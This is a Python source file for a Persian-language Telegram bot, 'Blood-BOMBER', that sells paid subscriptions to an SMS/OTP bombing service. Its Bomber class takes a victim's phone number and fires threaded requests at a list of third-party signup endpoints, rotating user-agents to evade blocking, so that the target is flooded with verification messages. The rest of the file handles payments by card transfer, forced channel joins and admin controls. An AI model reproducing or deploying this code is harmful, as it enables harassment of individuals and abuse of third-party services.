import random
import threading
import time
import requests
import os
import sqlite3
import telebot
from telebot import types
from flask import Flask
from datetime import datetime
import traceback

# ⚠️ ایمپورت لیست سرویس‌ها از فایل جداگانه
from services import SERVICES_LIST

# ==========================================
# 1. وب‌سرور برای سلامت پورت (Render)
# ==========================================
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is running!", 200
def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, use_reloader=False)
threading.Thread(target=run_web, daemon=True).start()

# ==========================================
# 2. تنظیمات و دیتابیس
# ==========================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = 6914309071
CARD_NUMBER = "6219861451021956" 
DB_FILE = "bot_database.db"
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

PANEL_IMAGE_URL = "https://i.imgur.com/Z7lvgzO.jpeg"
CHANNEL_1 = "@BloodBomber_Chanel"

# ⚠️ لیست یوزر-ایجنت‌های تصادفی برای آنتی‌بلاک
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY, name TEXT, plan TEXT, uses INTEGER, 
        last_daily REAL, sub_expiry REAL, daily_bomb_count INTEGER, last_bomb_date TEXT,
        total_purchases INTEGER DEFAULT 0, free_trial_used INTEGER DEFAULT 0,
        last_bomb_time REAL DEFAULT 0)''')
    conn.commit()
    conn.close()
init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row: return {"user_id": row[0], "name": row[1], "plan": row[2], "uses": row[3], "last_daily": row[4], "sub_expiry": row[5], "daily_bomb_count": row[6], "last_bomb_date": row[7], "total_purchases": row[8], "free_trial_used": row[9], "last_bomb_time": row[10]}
    return None

def save_user(user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases=0, free_trial_used=0, last_bomb_time=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", 
              (user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases, free_trial_used, last_bomb_time))
    conn.commit()
    conn.close()

user_states, pending_approvals, active_bombers, active_gift_codes = {}, {}, {}, {}

PLANS = {
    "basic": {"name": "پایه (۱ ماهه - روزانه ۳ ارسال)", "price": 150, "days": 30, "daily_limit": 3},
    "pro": {"name": "حرفه‌ای (۳ ماهه - روزانه ۵ ارسال)", "price": 450, "days": 90, "daily_limit": 5},
    "vip": {"name": "ویژه (۱ ساله - روزانه ۱۰ ارسال)", "price": 600, "days": 365, "daily_limit": 10}
}

# ==========================================
# 3. توابع بررسی جوین اجباری
# ==========================================
def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_1, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return True

def send_join_message(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📢 عضویت در کانال", url=f"https://t.me/{CHANNEL_1.replace('@', '')}"))
    markup.add(types.InlineKeyboardButton("✅ عضو شدم", callback_data="check_join"))
    bot.send_message(chat_id, "⚠️ **برای استفاده از ربات، ابتدا باید در کانال ما عضو شوید!**", reply_markup=markup, parse_mode='Markdown')

# ==========================================
# 4. هسته بمبر (با آنتی‌بلاک و آنتی‌اسپم)
# ==========================================
class Bomber:
    def __init__(self, phone_number, user_id):
        self.phone_number = phone_number
        self.user_id = user_id
        self.services = SERVICES_LIST  # استفاده از لیست جداگانه
        self.session = requests.Session()
        self.stop_event = threading.Event()
        self.success = 0
        self.fail = 0
        self.failed_services = {}

    def send_request(self, service):
        if self.stop_event.is_set(): return
        
        if self.failed_services.get(service['name'], 0) >= 3:
            return

        try:
            data = service['data']()
            if isinstance(data, dict):
                for key in ['phone', 'mobile', 'mobileNumber', 'cellphone', 'username', 'cell', 'mobileNo', 'phoneNumber']:
                    if key in data: data[key] = self.phone_number

            headers = {'User-Agent': random.choice(USER_AGENTS)}
            
            method = service['method'].upper()
            use_json = service.get('json', False)
            
            if method == 'POST':
                if use_json: resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                else: resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
            else:
                resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)
                
            if resp.status_code in (200, 201, 202, 204): self.success += 1
            else: self.fail += 1
        except:
            self.fail += 1
            self.failed_services[service['name']] = self.failed_services.get(service['name'], 0) + 1

    def worker(self, subset):
        for service in subset:
            if self.stop_event.is_set(): break
            self.send_request(service)
            time.sleep(random.uniform(0.5, 1.5))

    def start(self):
        if not self.services:
            bot.send_message(self.user_id, "❌ لیست سرویس‌ها خالی است.")
            return
        self.success, self.fail = 0, 0
        total = len(self.services)
        chunk_size = max(1, total // 15)
        threads = []
        
        if not self.phone_number.startswith("+"): 
            self.phone_number = "+98" + self.phone_number.lstrip("0")
            
        chunks = [self.services[i:i + chunk_size] for i in range(0, total, chunk_size)]
        for chunk in chunks:
            t = threading.Thread(target=self.worker, args=(chunk,))
            t.start()
            threads.append(t)
                
        for t in threads: t.join()
        percent = int((self.success / total) * 100) if total > 0 else 0
        bot.send_message(self.user_id, f"🏁 **گزارش:**\n✅ موفق: {self.success}\n❌ ناموفق: {self.fail}\n📊 درصد: {percent}%", parse_mode='Markdown')
        if self.user_id in active_bombers: del active_bombers[self.user_id]

# ==========================================
# 5. منوها
# ==========================================
def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="menu_bomb"),
        types.InlineKeyboardButton("🛒 خرید اشتراک", callback_data="menu_buy")
    )
    markup.add(
        types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily"),
        types.InlineKeyboardButton("📋 حساب کاربری", callback_data="menu_profile")
    )
    markup.add(
        types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard")
    )
    markup.add(types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support"))
    markup.add(types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"))
    return markup

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = str(message.from_user.id)
    
    if not is_user_joined(user_id):
        send_join_message(message.chat.id)
        return
        
    user = get_user(user_id)
    if not user:
        save_user(user_id, message.from_user.first_name, "free", 0, 0, 0, 0, "2000-01-01", 0, 0, 0)
        
    bot_info = bot.get_me()
    user_mention = f"[{message.from_user.first_name}](tg://user?id={user_id})"
    bot_mention = f"[Blood-BOMBER](tg://user?id={bot_info.id})"
    
    caption = f"سلام {user_mention} عزیز! 👋\nبه ربات **{bot_mention}** خوش آمدید."
    try:
        bot.send_photo(message.chat.id, PANEL_IMAGE_URL, caption=caption, reply_markup=get_main_menu(), parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, caption, reply_markup=get_main_menu(), parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 آمار کل", callback_data="admin_stats"),
        types.InlineKeyboardButton("📢 پیام همگانی", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("👤 مشاهده کاربر", callback_data="admin_view_user"),
        types.InlineKeyboardButton("💾 دریافت بکاپ", callback_data="admin_backup")
    )
    bot.reply_to(message, "👑 **پنل مدیریت**", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = str(call.from_user.id)
    
    if call.data == "check_join":
        if is_user_joined(user_id):
            bot.answer_callback_query(call.id, "✅ شما عضو شدید!", show_alert=True)
            cmd_start(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ شما هنوز عضو نشده‌اید!", show_alert=True)
        return
    
    if not is_user_joined(user_id):
        bot.answer_callback_query(call.id, "⚠️ ابتدا باید در کانال عضو شوید!", show_alert=True)
        return
        
    user = get_user(user_id)
    
    if call.data == "menu_back":
        caption = "منوی اصلی:"
        try:
            bot.edit_message_media(types.InputMediaPhoto(PANEL_IMAGE_URL, caption=caption, parse_mode='Markdown'), call.message.chat.id, call.message.message_id, reply_markup=get_main_menu())
        except:
            bot.edit_message_text(caption, call.message.chat.id, call.message.message_id, reply_markup=get_main_menu(), parse_mode='Markdown')
    
    elif call.data == "menu_profile":
        plan_name = PLANS[user['plan']]['name'] if user['plan'] in PLANS else "رایگان"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if user['sub_expiry'] > time.time():
            days_left = int((user['sub_expiry'] - time.time()) / 86400)
            vip_status = f"فعال ({days_left} روز مانده)"
        else:
            vip_status = "منقضی شده"
            
        text = (
            f"📋 **پروفایل:**\n\n"
            f"👤 نام: {user['name']}\n"
            f"🆔 آیدی: `{user_id}`\n"
            f"📅 تاریخ: `{current_time}`\n"
            f"💎 پلن: **{plan_name}**\n"
            f"👑 وضعیت اشتراک: **{vip_status}**\n"
        )
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_leaderboard":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT name, uses, user_id FROM users ORDER BY uses DESC LIMIT 5")
        rows = c.fetchall()
        conn.close()
        text = "🏆 **۵ کاربر برتر:**\n\n" + "".join([f"{i}. **{row[0]}** (آیدی: `{row[2]}`) ➜ {row[1]} ارسال\n" for i, row in enumerate(rows, 1)])
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_support":
        user_states[user_id] = {"state": "waiting_for_support"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption("🎧 پیام خود را بنویسید:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == "menu_daily":
        if time.time() - user['last_daily'] < 86400:
            bot.answer_callback_query(call.id, "⏳ امروز گرفته‌اید!", show_alert=True)
        else:
            user['uses'] += 2
            user['last_daily'] = time.time()
            save_user(**user)
            bot.answer_callback_query(call.id, "🎉 ۲ ارسال رایگان!", show_alert=True)

    elif call.data == "menu_gift":
        user_states[user_id] = {"state": "waiting_for_gift"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption("🔑 کد هدیه:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == "menu_buy":
        text = "🛒 **پلن‌های اشتراک:**\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key, plan in PLANS.items():
            markup.add(types.InlineKeyboardButton(f"{plan['name']} | {plan['price']} تومان", callback_data=f"buy_{key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("buy_"):
        plan_key = call.data.replace("buy_", "")
        plan = PLANS[plan_key]
        user_states[user_id] = {"selected_plan": plan_key}
        
        text = f"✅ پلن **{plan['name']}** انتخاب شد.\n\n💳 مبلغ **{plan['price']} هزار تومان** را واریز کنید.\n\n📸 سپس **عکس رسید** را بفرستید."
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("💳 اطلاعات کارت", callback_data=f"show_card_{plan_key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_buy"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("show_card_"):
        bot.answer_callback_query(call.id)
        text = f"💳 **شماره کارت برای واریز:**\n\n`{CARD_NUMBER}`\n\n(برای کپی، روی شماره کارت ضربه بزنید یا نگه دارید)"
        bot.send_message(call.message.chat.id, text, parse_mode='Markdown')

    elif call.data == "menu_bomb":
        if time.time() - user['last_bomb_time'] < 120:
            remaining = int(120 - (time.time() - user['last_bomb_time']))
            bot.answer_callback_query(call.id, f"⏳ لطفاً {remaining} ثانیه صبر کنید (آنتی‌اسپم).", show_alert=True)
            return
            
        if user['sub_expiry'] < time.time():
            bot.answer_callback_query(call.id, "❌ اشتراک شما منقضی شده! لطفاً تمدید کنید.", show_alert=True)
            return
            
        today = datetime.now().strftime("%Y-%m-%d")
        if user['last_bomb_date'] != today:
            user['last_bomb_date'] = today
            user['daily_bomb_count'] = 0
            
        plan_info = PLANS.get(user['plan'], {"daily_limit": 3})
        max_daily = plan_info["daily_limit"]
        
        if user['daily_bomb_count'] >= max_daily:
            bot.answer_callback_query(call.id, f"⚠️ سهمیه روزانه ({max_daily} ارسال) پر شده!", show_alert=True)
            return
            
        user_states[user_id] = {"state": "waiting_for_phone"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_caption(f"📞 **شماره را وارد کنید:**\n(سهمیه امروز شما: {max_daily - user['daily_bomb_count']} عدد)", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    # ================= ادمین =================
    elif call.data == "admin_stats" and call.from_user.id == ADMIN_ID:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE sub_expiry > ?", (time.time(),))
        active_vips = c.fetchone()[0]
        conn.close()
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"📊 **آمار:**\n👥 کاربران: {total_users}\n👑 اشتراک‌های فعال: {active_vips}", parse_mode='Markdown')

    elif call.data == "admin_broadcast" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "📝 متن پیام:")
        bot.register_next_step_handler(msg, send_broadcast)

    elif call.data == "admin_view_user" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🆔 آیدی عددی کاربر:")
        bot.register_next_step_handler(msg, view_user_admin)

    elif call.data == "admin_backup" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'rb') as f:
                bot.send_document(ADMIN_ID, f)

    elif call.data.startswith("admin_approve_"):
        req_id = call.data.replace("admin_approve_", "")
        if req_id in pending_approvals:
            data = pending_approvals[req_id]
            uid, plan_key = data["user_id"], data["plan"]
            plan = PLANS[plan_key]
            user_data = get_user(uid)
            if user_data:
                user_data["plan"] = plan_key
                user_data["sub_expiry"] = time.time() + (plan['days'] * 86400)
                user_data["total_purchases"] += 1
                save_user(**user_data)
                bot.send_message(uid, f"🎉 **پرداخت تایید شد!**\nاشتراک **{plan['name']}** برای شما فعال شد.", parse_mode='Markdown')
            bot.edit_message_text(f"✅ تایید شد.", call.message.chat.id, call.message.message_id)
            del pending_approvals[req_id]

    elif call.data.startswith("admin_reject_"):
        req_id = call.data.replace("admin_reject_", "")
        if req_id in pending_approvals:
            uid = pending_approvals[req_id]["user_id"]
            bot.edit_message_text("❌ رد شد.", call.message.chat.id, call.message.message_id)
            bot.send_message(uid, "❌ رسید شما رد شد.")
            del pending_approvals[req_id]

# ==========================================
# 6. دریافت ورودی‌ها
# ==========================================
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = str(message.from_user.id)
    if not is_user_joined(user_id):
        send_join_message(message.chat.id)
        return
        
    if "selected_plan" not in user_states.get(user_id, {}):
        bot.reply_to(message, "⚠️ ابتدا از منو یک پلن انتخاب کنید.")
        return
        
    plan_key = user_states[user_id]["selected_plan"]
    plan = PLANS[plan_key]
    req_id = f"{user_id}_{int(time.time())}"
    pending_approvals[req_id] = {"user_id": user_id, "plan": plan_key}
    
    bot.reply_to(message, "✅ رسید دریافت شد. منتظر تایید باشید.")
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"),
        types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}")
    )
    
    bot.send_message(ADMIN_ID, f"📩 **رسید:**\nکاربر: `{user_id}`\nپلن: **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    del user_states[user_id]

@bot.message_handler(func=lambda message: True)
def check_join_before_text(message):
    user_id = str(message.from_user.id)
    
    if message.from_user.id == ADMIN_ID:
        pass
    elif not is_user_joined(user_id):
        send_join_message(message.chat.id)
        return
        
    process_text_inputs(message)

def process_text_inputs(message):
    user_id = str(message.from_user.id)
    state = user_states[user_id].get("state") if user_id in user_states else None
    user = get_user(user_id)
    
    if not user: return
    
    if message.text == "لغو":
        del user_states[user_id]
        bot.reply_to(message, "عملیات لغو شد.", reply_markup=get_main_menu())
        return
    
    if state == "waiting_for_support":
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✍️ پاسخ", callback_data=f"admin_reply_{user_id}"))
        bot.send_message(ADMIN_ID, f"🎧 پیام از `{user_id}`:\n\n{message.text}", reply_markup=markup)
        bot.reply_to(message, "✅ پیام ارسال شد.")
        del user_states[user_id]

    elif state == "waiting_for_phone":
        if user['sub_expiry'] < time.time():
            bot.reply_to(message, "❌ اشتراک شما منقضی شده است!")
            del user_states[user_id]
            return
            
        phone = message.text.strip().replace(" ", "")
        if len(phone) < 10 or not phone.isdigit():
            bot.reply_to(message, "❌ فرمت نامعتبر. لطفاً فقط یک شماره معتبر وارد کنید. (مثال: 09123456789)")
            return
        
        today = datetime.now().strftime("%Y-%m-%d")
        if user['last_bomb_date'] != today:
            user['last_bomb_date'] = today
            user['daily_bomb_count'] = 0
            
        plan_info = PLANS.get(user['plan'], {"daily_limit": 3})
        if user['daily_bomb_count'] + 1 > plan_info["daily_limit"]:
            bot.reply_to(message, f"❌ سهمیه امروز شما ({plan_info['daily_limit']} عدد) پر شده است!")
            del user_states[user_id]
            return
            
        user['daily_bomb_count'] += 1
        user['last_bomb_time'] = time.time()
        save_user(**user)
        del user_states[user_id]
        
        bot.reply_to(message, f"🚀 **شروع شد!** هدف: `{phone}`", parse_mode='Markdown')
        bomber = Bomber(phone, user_id)
        active_bombers[user_id] = bomber
        threading.Thread(target=bomber.start).start()

    elif state == "waiting_for_gift":
        code = message.text.strip().upper()
        del user_states[user_id]
        if code in active_gift_codes and active_gift_codes[code]["uses"] > 0:
            amount = active_gift_codes[code]["amount"]
            active_gift_codes[code]["uses"] -= 1
            user['sub_expiry'] += (amount * 86400)
            save_user(**user)
            bot.reply_to(message, f"🎁 {amount} روز به اشتراک شما اضافه شد.")
        else:
            bot.reply_to(message, "❌ کد نامعتبر.")

def send_broadcast(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    for u in users:
        try: bot.send_message(u[0], f"📢 {message.text}"); time.sleep(0.1)
        except: pass
    bot.reply_to(message, f"✅ ارسال شد.")

def view_user_admin(message):
    uid = message.text.strip()
    user = get_user(uid)
    if user:
        expiry = datetime.fromtimestamp(user['sub_expiry']).strftime("%Y-%m-%d")
        bot.reply_to(message, f"👤 {user['name']}\n💎 {user['plan']}\n📅 انقضا: {expiry}")
    else: bot.reply_to(message, "❌ کاربر یافت نشد.")

if __name__ == "__main__":
    try:
        print("🤖 Bot & Web Server running...")
        bot.infinity_polling()
    except Exception as e:
        traceback.print_exc()
